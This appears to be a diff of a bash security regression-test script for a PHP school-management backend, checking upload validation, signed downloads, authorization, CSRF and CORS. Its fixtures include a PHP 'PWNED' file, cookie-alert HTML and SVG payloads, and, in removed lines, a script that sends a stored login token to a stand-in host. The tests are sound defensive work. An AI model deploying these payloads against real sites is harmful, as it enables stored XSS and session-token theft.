@@ -1,211 +1,130 @@
 #!/usr/bin/env bash
-# Security regression tests for the OTMS backend.
-#
-# Focuses on the file-upload surface: uploads land inside the web root, so an
-# endpoint that accepts an executable extension (php, phtml, ...) or an
-# HTML/SVG payload is a remote-code-execution / stored-XSS hole.
-#
-# Usage:  bash tools/api_security_test.sh
-set -uo pipefail
-
-PORT="${PORT:-8098}"
+# Security regression tests: authorization, private uploads, CSRF and CORS.
+set -euo pipefail
 ROOT="$(cd "$(dirname "$0")/.." && pwd)"
-BASE="http://127.0.0.1:$PORT/backend/api"
-UPLOADS="$ROOT/backend/uploads"
-BODY_FILE="$(mktemp)"
-SERVER_LOG="$(mktemp)"
+PORT="${PORT:-8098}"
+BASE="http://127.0.0.1:${PORT}/api/v1"
 WORK="$(mktemp -d)"
-PASS=0
-FAIL=0
-
-cleanup() {
-  [ -n "${SERVER_PID:-}" ] && kill "$SERVER_PID" 2>/dev/null
-  rm -rf "$WORK" "$BODY_FILE" "$SERVER_LOG"
-}
+STORAGE="$WORK/private-storage"
+BODY_FILE="$WORK/body"
+COOKIE_JAR="$WORK/cookies"
+SERVER_LOG="$WORK/server.log"
+PASS=0 FAIL=0 SERVER_PID=""
+cleanup() { [[ -n "$SERVER_PID" ]] && kill "$SERVER_PID" 2>/dev/null || true; rm -rf "$WORK"; }
 trap cleanup EXIT
 
-# An explicit production-style origin, to prove OTMS_ALLOWED_ORIGINS is honoured.
-OTMS_ALLOWED_ORIGINS="https://otms.example.com" \
-  php -S "127.0.0.1:$PORT" -t "$ROOT" >"$SERVER_LOG" 2>&1 &
+export OTMS_APP_ENV=local
+export OTMS_ALLOW_TEACHER_REGISTRATION=true
+export OTMS_DEMO_MODE=false
+export OTMS_APP_KEY='security-test-key-that-is-not-used-in-production'
+export OTMS_STORAGE_PATH="$STORAGE"
+export OTMS_ALLOWED_ORIGINS='https://portfolio.example.test'
+export OTMS_PUBLIC_BASE_URL="http://127.0.0.1:${PORT}"
+php -d upload_max_filesize=16M -d post_max_size=18M -S "127.0.0.1:${PORT}" -t "$ROOT/backend" >"$SERVER_LOG" 2>&1 &
 SERVER_PID=$!
-for _ in $(seq 1 60); do
-  if curl -s -o /dev/null "http://127.0.0.1:$PORT/" 2>/dev/null; then break; fi
-  sleep 0.25
-done
+for _ in $(seq 1 80); do curl -fsS "$BASE/health.php" >/dev/null 2>&1 && break; sleep .2; done
+curl -fsS "$BASE/health.php" >/dev/null || { cat "$SERVER_LOG" >&2; exit 1; }
 
-CODE=""
-BODY=""
-
-api() { # METHOD PATH [JSON_BODY] [TOKEN]
+CODE="" BODY=""
+request() {
   local method="$1" path="$2" data="${3:-}" token="${4:-}"
-  local args=(-s -o "$BODY_FILE" -w '%{http_code}' -X "$method" "$BASE/$path")
-  [ -n "$token" ] && args+=(-H "Authorization: Bearer $token")
-  [ -n "$data" ] && args+=(-H 'Content-Type: application/json' -d "$data")
-  CODE="$(curl "${args[@]}")"
-  BODY="$(cat "$BODY_FILE")"
+  local args=(-sS -o "$BODY_FILE" -w '%{http_code}' -X "$method" "$BASE/$path")
+  [[ -n "$token" ]] && args+=(-H "Authorization: Bearer $token")
+  [[ -n "$data" ]] && args+=(-H 'Content-Type: application/json' --data "$data")
+  CODE="$(curl "${args[@]}")"; BODY="$(cat "$BODY_FILE")"
 }
-
-upload() { # PATH TOKEN FILE [FIELD=value ...]
-  local path="$1" token="$2" file="$3"
-  shift 3
-  local args=(-s -o "$BODY_FILE" -w '%{http_code}' -X POST "$BASE/$path"
-              -H "Authorization: Bearer $token" -F "file=@$file")
-  for field in "$@"; do args+=(-F "$field"); done
-  CODE="$(curl "${args[@]}")"
-  BODY="$(cat "$BODY_FILE")"
+post() { request POST "$1" "$2" "${3:-}"; }
+get() { request GET "$1" "" "${2:-}"; }
+upload() { # endpoint token path field=value...
+  local endpoint="$1" token="$2" file="$3"; shift 3
+  local args=(-sS -o "$BODY_FILE" -w '%{http_code}' -X POST "$BASE/$endpoint" -H "Authorization: Bearer $token" -F "file=@$file")
+  local field; for field in "$@"; do args+=(-F "$field"); done
+  CODE="$(curl "${args[@]}")"; BODY="$(cat "$BODY_FILE")"
 }
+ok() { PASS=$((PASS+1)); printf '  ok   %s\n' "$1"; }
+bad() { FAIL=$((FAIL+1)); printf '  FAIL %s\n       response(%s): %s\n' "$1" "$CODE" "$BODY"; }
+expect_code() { [[ "$CODE" == "$2" ]] && ok "$1" || bad "$1 (expected HTTP $2)"; }
+expect_jq() { jq -e "$2" >/dev/null 2>&1 <<<"$BODY" && ok "$1" || bad "$1 (jq: $2)"; }
+section() { printf '\n-- %s --\n' "$1"; }
 
-json() {
-  python3 -c "
-import json,sys
-try:
-    d = json.load(sys.stdin)
-except Exception:
-    d = {}
-print($1)
-" <<<"$BODY" 2>/dev/null
+STAMP="$(date +%s)-$$"; PASSWORD='correct horse battery staple'
+register() {
+  local name="$1" email="$2" role="$3"
+  post register.php "$(jq -nc --arg n "$name" --arg e "$email" --arg p "$PASSWORD" --arg r "$role" '{full_name:$n,email:$e,password:$p,role:$r}')"
+  jq -r '.token' <<<"$BODY"
 }
+TT="$(register Teacher "security-teacher-$STAMP@example.test" teacher)"
+ST="$(register Student "security-student-$STAMP@example.test" student)"
+OT="$(register Outsider "security-outsider-$STAMP@example.test" student)"
+post class_create.php '{"name":"Security class","description":"private","color":"#2563EB"}' "$TT"; CLASS_ID="$(jq -r '.id' <<<"$BODY")"
+request GET code_get.php '' "$TT"; TCODE="$(jq -r '.code' <<<"$BODY")"
+post code_lookup.php "$(jq -nc --arg c "$TCODE" '{code:$c}')" "$ST"; GRANT="$(jq -r '.join_grant' <<<"$BODY")"
+post enroll.php "$(jq -nc --argjson c "$CLASS_ID" --arg g "$GRANT" '{class_id:$c,join_grant:$g}')" "$ST"
+post homework_create.php "$(jq -nc --argjson c "$CLASS_ID" '{class_id:$c,title:"Private upload homework",allow_resubmit:true}')" "$TT"; HW_ID="$(jq -r '.id' <<<"$BODY")"
+post lesson_create.php "$(jq -nc --argjson c "$CLASS_ID" '{class_id:$c,title:"Private files"}')" "$TT"; LESSON_ID="$(jq -r '.id' <<<"$BODY")"
 
-check() { # NAME EXPECTED ACTUAL
-  if [ "$2" = "$3" ]; then
-    PASS=$((PASS + 1)); printf '  ok    %s\n' "$1"
-  else
-    FAIL=$((FAIL + 1))
-    printf '  FAIL  %s\n        expected: %s\n        actual:   %s\n' "$1" "$2" "$3"
-  fi
-}
+printf '<?php echo "PWNED"; ?>' >"$WORK/evil.php"
+printf '<script>alert(document.cookie)</script>' >"$WORK/active.html"
+printf 'not really a pdf' >"$WORK/spoofed.pdf"
+printf '%%PDF-1.4\n1 0 obj\n<<>>\nendobj\n%%%%EOF\n' >"$WORK/valid.pdf"
+dd if=/dev/zero of="$WORK/huge.pdf" bs=1M count=9 status=none
 
-check_true() { check "$1" "true" "$([ "$2" = "$3" ] && echo true || echo false)"; }
-
-# Runs a scalar SQL query through the project's own database configuration, so
-# the scripts honour OTMS_DB_* and work on Windows too (where the mysql client
-# is usually not on PATH). Prints the first column of the first row, or nothing
-# if the query fails -- callers treat that as "unknown" rather than an error.
-dbq() { # SQL
-  php -r '
-function fail($message = "", $code = 400) { fwrite(STDERR, $message); exit(1); }
-require $argv[2];
-try {
-    $row = db()->query($argv[1])->fetch(PDO::FETCH_NUM);
-    echo $row === false ? "" : $row[0];
-} catch (Throwable $e) { fwrite(STDERR, $e->getMessage()); exit(1); }
-' "$1" "$ROOT/backend/config.php" 2>/dev/null
-}
-
-# --- fixtures ---------------------------------------------------------------
-printf '<?php echo "PWNED"; ?>' >"$WORK/payload.php"
-printf '<?php echo "PWNED"; ?>' >"$WORK/payload.phtml"
-printf '<script>fetch("//evil.test/"+localStorage.otms_token)</script>' >"$WORK/payload.html"
-printf '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>' >"$WORK/payload.svg"
-printf '%%PDF-1.4 legit homework' >"$WORK/homework.pdf"
-printf 'PNGDATA' >"$WORK/photo.png"
-head -c 12000000 /dev/zero >"$WORK/huge.pdf"
-
-api POST login.php '{"email":"teacher@otms.test","password":"password"}'
-TT=$(json "d.get('token','')")
-api POST login.php '{"email":"student@otms.test","password":"password"}'
-ST=$(json "d.get('token','')")
-
-api POST class_create.php '{"name":"Sec Test Class","description":"s","color":"#6366F1"}' "$TT"
-CLASS_ID=$(json "int(d.get('id',0))")
-api POST enroll.php "{\"class_id\":$CLASS_ID}" "$ST"
-api POST homework_create.php "{\"class_id\":$CLASS_ID,\"title\":\"Sec HW\",\"description\":\"d\"}" "$TT"
-HW_ID=$(json "int(d.get('id',0))")
-api POST lesson_create.php "{\"class_id\":$CLASS_ID,\"title\":\"Sec Lesson\"}" "$TT"
-LESSON_ID=$(json "int(d.get('id',0))")
-
-echo "== every upload attempt is made by a *student*, the least privileged role"
-
-# --- executable extensions --------------------------------------------------
-echo
-echo "-- executable extensions (a student can submit homework)"
-for ext in php phtml php5 phar; do
-  cp "$WORK/payload.php" "$WORK/evil.$ext"
-  upload submission_submit.php "$ST" "$WORK/evil.$ext" "homework_id=$HW_ID"
-  check "upload .$ext as homework is rejected" "415" "$CODE"
-  check_true "no .$ext file written to uploads/" "0" "$(find "$UPLOADS" -name "*.$ext" 2>/dev/null | wc -l | tr -d ' ')"
-done
-
-upload content_create.php "$ST" "$WORK/evil.php" "lesson_id=$LESSON_ID" "type=booklet" "title=x"
-check "student cannot upload at all (teacher-only endpoint)" "403" "$CODE"
-
-api POST login.php '{"email":"teacher@otms.test","password":"password"}'
-TT=$(json "d.get('token','')")
-upload content_create.php "$TT" "$WORK/evil.php" "lesson_id=$LESSON_ID" "type=booklet" "title=x"
-check "upload .php as lesson material is rejected" "415" "$CODE"
-check_true "no php file written to uploads/" "0" "$(find "$UPLOADS" -name '*.php' 2>/dev/null | wc -l | tr -d ' ')"
-
-# --- active-content extensions (stored XSS from the app's own origin) -------
-echo
-echo "-- active content (would run script in the app's origin)"
-for ext in html svg xhtml; do
-  cp "$WORK/payload.html" "$WORK/active.$ext"
-  upload submission_submit.php "$ST" "$WORK/active.$ext" "homework_id=$HW_ID"
-  check "upload .$ext is rejected" "415" "$CODE"
-  check_true "no .$ext file written to uploads/" "0" \
-    "$(find "$UPLOADS" -name "*.$ext" 2>/dev/null | wc -l | tr -d ' ')"
-done
-
-# --- legitimate files still work -------------------------------------------
-echo
-echo "-- legitimate attachments still work"
-upload submission_submit.php "$ST" "$WORK/homework.pdf" "homework_id=$HW_ID" "text=see attached"
-check "upload .pdf is accepted" "201" "$CODE"
-UPLOADED_PATH=$(dbq "SELECT file_path FROM submissions WHERE homework_id = $HW_ID ORDER BY id DESC LIMIT 1")
-check_true "submission stores a file path" "true" "$([ -n "$UPLOADED_PATH" ] && echo true || echo false)"
-check_true "stored name is randomised, not attacker-chosen" "true" \
-  "$([ -f "$ROOT/backend/$UPLOADED_PATH" ] && echo true || echo false)"
-check_true "stored name differs from the uploaded filename" "true" \
-  "$([ "$(basename "$UPLOADED_PATH")" != "homework.pdf" ] && echo true || echo false)"
-
-upload submission_submit.php "$ST" "$WORK/photo.png" "homework_id=$HW_ID"
-check "upload .png is accepted" "201" "$CODE"
-
-# --- size limit -------------------------------------------------------------
-echo
-echo "-- size limit"
+section upload-validation
+upload submission_submit.php "$ST" "$WORK/evil.php" "homework_id=$HW_ID"
+expect_code 'executable extension rejected' 415
+upload submission_submit.php "$ST" "$WORK/active.html" "homework_id=$HW_ID"
+expect_code 'active HTML rejected' 415
+upload submission_submit.php "$ST" "$WORK/spoofed.pdf" "homework_id=$HW_ID"
+expect_code 'MIME/extension mismatch rejected' 415
 upload submission_submit.php "$ST" "$WORK/huge.pdf" "homework_id=$HW_ID"
-check "oversized upload is rejected" "413" "$CODE"
+expect_code 'file over 8 MB rejected' 413
+upload submission_submit.php "$ST" "$WORK/valid.pdf" "homework_id=$HW_ID" 'text=private answer'
+expect_code 'legitimate PDF accepted' 201
+[[ "$(find "$STORAGE" -type f | wc -l)" == 1 ]] && ok 'upload stored outside document root' || bad 'upload stored outside document root'
+PUBLIC_UPLOAD_COUNT="$(find "$ROOT/backend/uploads" -type f ! -name '.gitignore' ! -name '.htaccess' 2>/dev/null | wc -l)"
+[[ "$PUBLIC_UPLOAD_COUNT" == 0 ]] && ok 'no files are written to the legacy public upload directory' || bad 'no files are written to the legacy public upload directory'
 
-# --- storage location -------------------------------------------------------
-echo
-echo "-- uploads are not listable"
-DIR_CODE=$(curl -s -o "$BODY_FILE" -w '%{http_code}' "http://127.0.0.1:$PORT/backend/uploads/")
-check_true "directory index is not served" "true" \
-  "$([ "$DIR_CODE" = "403" ] || [ "$DIR_CODE" = "404" ] && echo true || echo false)"
+section authorized-downloads
+get "submissions_list.php?homework_id=$HW_ID" "$TT"
+DOWNLOAD_PATH="$(jq -r '.submissions[0].file_path' <<<"$BODY")"
+FILE_ID="$(sed -n 's/.*[?&]id=\([0-9]*\).*/\1/p' <<<"$DOWNLOAD_PATH")"
+CODE="$(curl -sS -o "$WORK/downloaded.pdf" -w '%{http_code}' "$BASE/$DOWNLOAD_PATH")"
+expect_code 'short-lived signed URL downloads without exposing storage path' 200
+cmp -s "$WORK/valid.pdf" "$WORK/downloaded.pdf" && ok 'download bytes match original' || bad 'download bytes match original'
+CODE="$(curl -sS -o "$BODY_FILE" -w '%{http_code}' "$BASE/file_download.php?id=$FILE_ID")"; BODY="$(cat "$BODY_FILE")"
+expect_code 'bare file id requires authentication' 401
+CODE="$(curl -sS -o "$BODY_FILE" -w '%{http_code}' -H "Authorization: Bearer $OT" "$BASE/file_download.php?id=$FILE_ID")"; BODY="$(cat "$BODY_FILE")"
+expect_code 'unenrolled student cannot download another submission' 403
+CODE="$(curl -sS -o "$BODY_FILE" -w '%{http_code}' -H "Authorization: Bearer $TT" "$BASE/file_download.php?id=$FILE_ID")"; BODY="$(cat "$BODY_FILE")"
+expect_code 'owning teacher can download student submission' 200
+TAMPERED="$(sed 's/sig=[a-f0-9]*/sig=deadbeef/' <<<"$DOWNLOAD_PATH")"
+CODE="$(curl -sS -o "$BODY_FILE" -w '%{http_code}' "$BASE/$TAMPERED")"; BODY="$(cat "$BODY_FILE")"
+expect_code 'tampered signed URL is rejected' 401
 
-# --- CORS -------------------------------------------------------------------
-echo
-echo "-- CORS origins"
-acao() { # ORIGIN -> the Access-Control-Allow-Origin header value, if any
-  curl -s -o /dev/null -D - -H "Origin: $1" "$BASE/me.php" \
-    | tr -d '\r' | awk 'tolower($1)=="access-control-allow-origin:"{print $2}'
-}
-check "localhost dev origin is allowed" "http://localhost:12345" "$(acao http://localhost:12345)"
-check "Android emulator origin is allowed" "http://10.0.2.2:8080" "$(acao http://10.0.2.2:8080)"
-check "configured origin is allowed" "https://otms.example.com" "$(acao https://otms.example.com)"
-check "third-party origin gets no allow-origin header" "" "$(acao https://evil.test)"
+section class-material-authorization
+upload content_create.php "$TT" "$WORK/valid.pdf" "lesson_id=$LESSON_ID" 'type=booklet' 'title=Teacher file'
+expect_code 'teacher uploads private class material' 201
+get "content_list.php?lesson_id=$LESSON_ID" "$ST"; MATERIAL_PATH="$(jq -r '.contents[0].file_path' <<<"$BODY")"
+CODE="$(curl -sS -o "$BODY_FILE" -w '%{http_code}' "$BASE/$MATERIAL_PATH")"; BODY="$(cat "$BODY_FILE")"
+expect_code 'enrolled student can use signed class-material URL' 200
+MATERIAL_ID="$(sed -n 's/.*[?&]id=\([0-9]*\).*/\1/p' <<<"$MATERIAL_PATH")"
+CODE="$(curl -sS -o "$BODY_FILE" -w '%{http_code}' -H "Authorization: Bearer $OT" "$BASE/file_download.php?id=$MATERIAL_ID")"; BODY="$(cat "$BODY_FILE")"
+expect_code 'unenrolled student cannot fetch class material by id' 403
 
-# --- login throttling -------------------------------------------------------
-echo
-echo "-- login throttling"
-# A dedicated address, so the real test accounts are not left locked out.
-THROTTLE_EMAIL="nobody@otms.test"
-dbq "DELETE FROM login_attempts WHERE email = '$THROTTLE_EMAIL'" >/dev/null
-LAST=""
-for _ in $(seq 1 10); do
-  api POST login.php "{\"email\":\"$THROTTLE_EMAIL\",\"password\":\"guess\"}"
-  LAST="$CODE"
-done
-check "guesses within the limit are rejected as bad credentials" "401" "$LAST"
+section csrf-and-cors
+WEB_EMAIL="security-teacher-$STAMP@example.test"
+LOGIN_JSON="$(jq -nc --arg e "$WEB_EMAIL" --arg p "$PASSWORD" '{email:$e,password:$p}')"
+CODE="$(curl -sS -o "$BODY_FILE" -w '%{http_code}' -c "$COOKIE_JAR" -H 'X-OTMS-Client: web' -H 'Content-Type: application/json' --data "$LOGIN_JSON" "$BASE/login.php")"; BODY="$(cat "$BODY_FILE")"
+expect_code 'web login receives cookie session' 200
+CSRF="$(jq -r '.csrf_token' <<<"$BODY")"
+CODE="$(curl -sS -o "$BODY_FILE" -w '%{http_code}' -b "$COOKIE_JAR" -H 'X-OTMS-Client: web' -H 'Content-Type: application/json' --data '{"full_name":"Blocked CSRF"}' "$BASE/profile_update.php")"; BODY="$(cat "$BODY_FILE")"
+expect_code 'cookie mutation without CSRF token is rejected' 403
+expect_jq 'CSRF error has fixed code' '.error.code == "CSRF_FAILED"'
+CODE="$(curl -sS -o "$BODY_FILE" -w '%{http_code}' -b "$COOKIE_JAR" -H 'X-OTMS-Client: web' -H "X-CSRF-Token: $CSRF" -H 'Content-Type: application/json' --data '{"full_name":"CSRF Protected"}' "$BASE/profile_update.php")"; BODY="$(cat "$BODY_FILE")"
+expect_code 'valid CSRF token permits cookie mutation' 200
+acao() { curl -sS -o /dev/null -D - -H "Origin: $1" "$BASE/health.php" | tr -d '\r' | awk 'tolower($1)=="access-control-allow-origin:"{print $2}'; }
+[[ "$(acao https://portfolio.example.test)" == 'https://portfolio.example.test' ]] && ok 'configured CORS origin allowed' || bad 'configured CORS origin allowed'
+[[ -z "$(acao https://evil.example.test)" ]] && ok 'unconfigured CORS origin blocked' || bad 'unconfigured CORS origin blocked'
 
-api POST login.php "{\"email\":\"$THROTTLE_EMAIL\",\"password\":\"guess\"}"
-check "next guess is throttled" "429" "$CODE"
-
-api POST login.php '{"email":"teacher@otms.test","password":"password"}'
-check "throttling one account does not block another" "200" "$CODE"
-
-dbq "DELETE FROM login_attempts WHERE email = '$THROTTLE_EMAIL'" >/dev/null
-
-printf '\n== %d passed, %d failed\n' "$PASS" "$FAIL"
-[ "$FAIL" -eq 0 ]
+printf '\n== %d passed, %d failed ==\n' "$PASS" "$FAIL"
+if (( FAIL > 0 )); then tail -n 100 "$SERVER_LOG" >&2; exit 1; fi
